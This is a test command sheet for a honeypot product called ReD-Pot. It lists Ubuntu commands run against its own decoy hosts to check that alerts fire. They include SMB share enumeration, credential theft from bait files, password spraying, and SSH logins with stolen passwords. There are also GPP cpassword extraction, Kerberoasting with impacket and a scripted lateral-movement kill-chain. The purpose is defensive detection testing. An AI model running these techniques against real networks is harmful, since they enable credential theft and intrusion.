# ReD-Pot — test command sheet (Ubuntu CLI)

Run these from a **separate Ubuntu machine on the decoy LAN** (not from the ReD-Pot server itself).
Replace the placeholders before running:

| Placeholder | Meaning | Example |
|---|---|---|
| `x.x.x.x` | IP of the decoy you are testing | `10.0.50.10` |
| `<DOMAIN>` | AD / DNS domain chosen in the installer | `corp.ararat.am` |
| `<NB>` | NetBIOS domain name (derived from the domain; shown on the installer's review screen) | `ARARAT` |
| `<FS>` `<WEB>` `<BKP>` `<DC>` `<DNS>` | decoy host names | `FS01`, `WEB01`, `BKP01`, `DC01`, `DNS01` |
| `<PASS_…>` | passwords **stolen from the baits** in the steps below (each deployment generates its own) | |

A Community Edition install has **at most 3 decoys** (on the manager plus remote sensors), so run the sections for the
roles you deployed. Baits only name decoys that really exist, so the passwords you find point only at those.

After every block open the console (**Events** / **Incidents**) and check the expected level:
**L1** touch · **L2** interaction · **L3** intent (scan, brute force, sensitive path) · **L4** compromise (login, file read/upload) · **L5** honeytoken used.

---

## 0. Tools (once)

```bash
sudo apt update
sudo apt install -y nmap smbclient curl sshpass lftp dnsutils ldap-utils krb5-user netcat-openbsd freerdp3-x11
# impacket (Kerberoast, AS-REQ, SMB scripts)
sudo apt install -y pipx && pipx install impacket && pipx ensurepath   # open a new shell after this
```

> `krb5-user` asks for a default realm — type `<DOMAIN>` in CAPITALS, or just press Enter.
> On Ubuntu ≤ 24.04 the RDP client package is `freerdp2-x11` (command `xfreerdp`).

---

## 1. Any decoy — discovery (expect L1 → L3 "scan")

```bash
ping -c 2 x.x.x.x                                   # no event (ICMP is not logged)
nc -vz x.x.x.x 445                                  # L1 touch
nmap -Pn -sT x.x.x.x                                # ≥5 ports in 10 min → L3 port scan
nmap -Pn -sV -p 21,22,53,80,88,135,139,389,443,445,636,3268,3269,3389 x.x.x.x   # service banners
```

---

## 2. Windows File Server — ports 135 139 445 3389

```bash
# share enumeration (L2/L3)
smbclient -L //x.x.x.x -N                                   # access denied (Server 2019: no anonymous share list), L3
smbclient //x.x.x.x/IPC\$ -N -c 'ls'                         # access denied, smb.admin_share L3 (IPC$ is pipes only)
smbclient //x.x.x.x/PUBLIC -N -c 'ls'

# steal the bait: IT share (L4 file read)
smbclient //x.x.x.x/IT -N -c 'ls; get passwords.txt; cd keys; ls; mget *' -E 2>/dev/null
cat passwords.txt                                   # → deploy / backup / dnsadmin for the DEPLOYED decoys only + svc_scan

# other departments (Word files contain a beacon — opening one in Word = CANARY)
smbclient //x.x.x.x/FINANCE -N -c 'ls'
smbclient //x.x.x.x/HR -N -c 'ls'

# use a STOLEN credential on the file server itself → L5 honeytoken (logon works, shares listed)
smbclient //x.x.x.x/IT -U '<NB>\svc_backup%<PASS_svc_backup>' -c 'ls'
# same bait account, wrong password → NT_STATUS_LOGON_FAILURE, L4 (attempt, never L5)
smbclient //x.x.x.x/IT -U '<NB>\svc_backup%wrong' -c 'ls'

# persona: Windows Server 2019 (10.0 build 17763), SMB1 disabled, no impacket defaults
nmap -Pn -p 445 --script smb-protocols,smb2-time,smb2-security-mode x.x.x.x   # 2:0:2 + 2:1:0 only, start_date N/A

# password spraying (every try → NT_STATUS_LOGON_FAILURE; ≥5 fails / 5 min, ≥3 users → L3 spraying)
for u in administrator j.smith a.petrosyan backup it; do
  smbclient -L //x.x.x.x -U "<NB>\\$u%Winter2026!" 2>&1 | tail -1; done

# upload (L4, stored read-only + sha256 in the sensor's upload store; other shares → ACCESS_DENIED, still L4)
echo test > note.txt && smbclient //x.x.x.x/PUBLIC -N -c 'put note.txt'
smbclient //x.x.x.x/IT -N -c 'put note.txt'

# RDP / NLA: user + domain + workstation logged (L3); ERRCONNECT_LOGON_FAILURE
xfreerdp3 /v:x.x.x.x /u:administrator /p:Passw0rd /cert:ignore +auth-only
# stolen bait password over RDP → L5; client shows ERRCONNECT_LOGON_TYPE_NOT_GRANTED
xfreerdp3 /v:x.x.x.x /u:svc_backup /p:'<PASS_svc_backup>' /d:<NB> /cert:ignore +auth-only
nmap -Pn -p 3389 --script rdp-ntlm-info x.x.x.x       # persona names + Product_Version 10.0.17763
```

---

## 3. Linux Web Hosting — ports 22 80 443

```bash
# web recon (L2)
curl -si http://x.x.x.x/ | head -20
curl -sk https://x.x.x.x/ -o /dev/null -w '%{http_code}\n'
curl -s  http://x.x.x.x/robots.txt

# sensitive files (L3 probe / L4 sensitive read)
curl -s  http://x.x.x.x/.env                         # bait: DB password reused on the backup FTP
for p in .git/config .git/HEAD server-status backup/ wp-config.php.bak; do   # 403 ×4, 404 (no WordPress here)
  echo -n "$p "; curl -s -o /dev/null -w '%{http_code}\n' http://x.x.x.x/$p; done

# directory brute force (≥15 × 404 in 2 min → L3)
for i in $(seq 1 20); do curl -s -o /dev/null http://x.x.x.x/nothere$i; done

# front page = webmail (default) / helpdesk / intranet — chosen in the installer
curl -s http://x.x.x.x/ | grep -o '<title>[^<]*'
curl -s http://x.x.x.x/login -d 'user=j.smith@<DOMAIN>&pass=Winter2026!' | grep -o 'Login failed[^<]*'   # L2/L3
curl -si http://x.x.x.x/login -d 'user=admin@<DOMAIN>&pass=<PASS_admin>' | grep -i '^location'          # → / (inbox), L5

# admin portal login (fail = L3 brute force after 5; correct = L5)
curl -si http://x.x.x.x/admin/login -d 'username=admin&password=admin123' | head -1
curl -si http://x.x.x.x/admin/login -d 'username=admin&password=<PASS_admin>' | grep -i location   # from the BKP db dump

# SSH (fail = L2/L3; stolen deploy password = L5)
ssh -o StrictHostKeyChecking=no root@x.x.x.x               # type any password a few times
sshpass -p '<PASS_deploy>' ssh -o StrictHostKeyChecking=no deploy@x.x.x.x 'id; ls -la; cat notes.txt; cat .bash_history'
# or with the stolen key from \\<FS>\IT\keys
chmod 600 <web>_deploy.key && ssh -i <web>_deploy.key -o StrictHostKeyChecking=no deploy@x.x.x.x 'uname -a'
```

---

## 4. FTP / Backup Server — ports 21 22

```bash
nc -v x.x.x.x 21                                    # banner (L1)
curl -s ftp://x.x.x.x/ --user anonymous:a@b.c       # anonymous refused (L2)

# stolen backup password from \\<FS>\IT\passwords.txt → L5
lftp -u 'backup,<PASS_backup>' x.x.x.x -e 'ls; cd backups; ls; mget *; cd ../configs; mget *; bye'
grep -i "admin\|TODO" *_portal_db_*.sql             # → admin MD5 + hint for the WEB portal (only with a web decoy)
tar tzf *_portal_site_*.tar.gz; tar tzf *_etc_*.tar.gz   # real archives
cat backup_job.ps1                                  # → <NB>\svc_backup password

# reused DB password from WEB /.env also works here → L5
lftp -u 'webadmin,<PASS_webadmin>' x.x.x.x -e 'ls; bye'

# upload (L4, file kept read-only + sha256; over the per-sensor quota → "451", file.write dropped)
echo test > up.txt && curl -s -T up.txt ftp://x.x.x.x/ --user 'backup:<PASS_backup>'

# SSH with the same backup account → L5
sshpass -p '<PASS_backup>' ssh -o StrictHostKeyChecking=no backup@x.x.x.x 'ls /srv/ftp/backups'   # same files as FTP
sshpass -p '<PASS_backup>' ssh backup@x.x.x.x 'cat /etc/x 2>/dev/null; echo $SHELL; ps aux | head -3; curl http://1.1.1.1'
```

---

## 5. Windows Domain Controller — ports 53 88 135 139 389 445 464 636 3268 3269 3389 (udp 53 88 123 137 389)

```bash
# DNS + SRV records (L2)
dig @x.x.x.x _ldap._tcp.<DOMAIN> SRV +short
dig @x.x.x.x <DC>.<DOMAIN> +short

# LDAP rootDSE (L2) and anonymous search (refused, L3)
ldapsearch -x -H ldap://x.x.x.x -s base -b '' namingContexts defaultNamingContext dnsHostName
ldapsearch -x -H ldap://x.x.x.x -b 'DC=corp,DC=example,DC=com' '(objectClass=user)'     # use your <DOMAIN> parts

# SYSVOL / NETLOGON baits (L4 file read)
smbclient //x.x.x.x/NETLOGON -N -c 'get logon.bat' && cat logon.bat              # → svc_print password
smbclient //x.x.x.x/SYSVOL -N -c 'recurse ON; prompt OFF; mget *'
find . -name Groups.xml -exec grep -o 'cpassword="[^"]*"' {} \;                   # GPP cpassword (srv_localadm)

# LDAP bind with a stolen account → L5
ldapsearch -x -H ldap://x.x.x.x -D '<NB>\svc_print' -w '<PASS_svc_print>' -b 'DC=corp,DC=example,DC=com' '(servicePrincipalName=*)' sAMAccountName description servicePrincipalName
#   → svc_sql has its password in "description"

# Kerberos user enumeration (throttled; L3; svc_sql in the list = honeytoken.attempt L4, never L5)
GetNPUsers.py <DOMAIN>/ -dc-ip x.x.x.x -no-pass -usersfile <(printf 'administrator\nsvc_sql\nj.smith\n')
# NTLM LDAP bind + Kerberoast of the honey SPN → L5 (TGT for svc_print, TGS for svc_sql: the $krb5tgs$23$ hash
# cracks to the svc_sql password from its description)
GetUserSPNs.py '<DOMAIN>/svc_print:<PASS_svc_print>' -dc-ip x.x.x.x -request
GetADUsers.py '<DOMAIN>/svc_print:<PASS_svc_print>' -dc-ip x.x.x.x -all          # NTLM (SASL, sealed) bind → user list
getTGT.py '<DOMAIN>/svc_print:<PASS_svc_print>' -dc-ip x.x.x.x                   # → svc_print.ccache, L5
KRB5CCNAME=svc_print.ccache getST.py -k -no-pass -spn 'MSSQLSvc/sql01.<DOMAIN>:1433' -dc-ip x.x.x.x '<DOMAIN>/svc_print'
getTGT.py '<DOMAIN>/svc_print:Wrong123!' -dc-ip x.x.x.x                          # PREAUTH_FAILED, auth.failed L3
nxc ldap x.x.x.x -u svc_print -p '<PASS_svc_print>' --kerberoasting out.txt     # NetExec (NTLM bind; not in the CI tool set)

# LDAPS / Global Catalog (L1/L2)
openssl s_client -connect x.x.x.x:636 </dev/null 2>/dev/null | head -5
ldapsearch -x -H ldap://x.x.x.x:3268 -s base -b ''
```

```bash
# DC UDP services and DNS persona
nmap -sU -sV -p 53,88,123,137,389 --script nbstat,ntp-info x.x.x.x   # CLDAP = "Microsoft Windows Active Directory LDAP"
net ads lookup -S x.x.x.x                                           # CLDAP netlogon ping → LOGON_SAM_LOGON_RESPONSE_EX (L2)
nmblookup -A x.x.x.x                                                # node status: DC01<20>, <NB><1C>/<1B> (L2)
dig @x.x.x.x version.bind chaos txt                                 # Windows default: NOTIMP, no version (L3)
```

> Known gap: Kerberos-authenticated LDAP binds (`-k`, GSSAPI) are refused (invalidCredentials); NTLM binds work.

---

## 6. Linux DNS Server — ports 22 53

```bash
dig @x.x.x.x <DOMAIN> SOA +short                    # L2
dig @x.x.x.x <WEB>.<DOMAIN> +short
dig @x.x.x.x axfr <DOMAIN>                          # zone transfer attempt → L3
dig @x.x.x.x version.bind chaos txt +short          # fingerprinting → logged (BIND 9 persona on this role)
dig @x.x.x.x google.com +short                      # external name → REFUSED (no open resolver)

# SSH with the dnsadmin password from \\<FS>\IT\passwords.txt → L5
sshpass -p '<PASS_dnsadmin>' ssh -o StrictHostKeyChecking=no dnsadmin@x.x.x.x 'cat zone-notes.txt; cat .bash_history'
```

---

## 7. Full kill-chain in one go (several decoys)

This uses three decoys (file server, web server, backup server), the most a Community Edition install can have.
With a different set of 3 roles, adapt the targets; with fewer, skip the steps for the missing ones.

```bash
FS=x.x.x.x; WEB=x.x.x.x; BKP=x.x.x.x
nmap -Pn -sT -p 21,22,80,445 $FS $WEB $BKP                                   # L3 scan
smbclient //$FS/IT -N -c 'get passwords.txt'                                 # L4 steal
P=$(grep -m1 'deploy' passwords.txt | awk '{print $NF}')
sshpass -p "$P" ssh -o StrictHostKeyChecking=no deploy@$WEB 'id'             # L5 lateral movement
curl -s http://$WEB/.env | grep DB_PASSWORD                                  # L4
```

Expected result: one **L5 incident** in the console that links all steps to your source IP
(Overview → click the host on the internal map to see the numbered attack path).

---

## 8. Clean-up on the tester

```bash
rm -f passwords.txt *.key *.key.pub note.txt up.txt logon.bat *_portal_db_*.sql *.tar.gz backup_job.ps1 *.sh *.cmd ftp_*.txt upload.netrc; rm -rf ./<DOMAIN> Policies
```
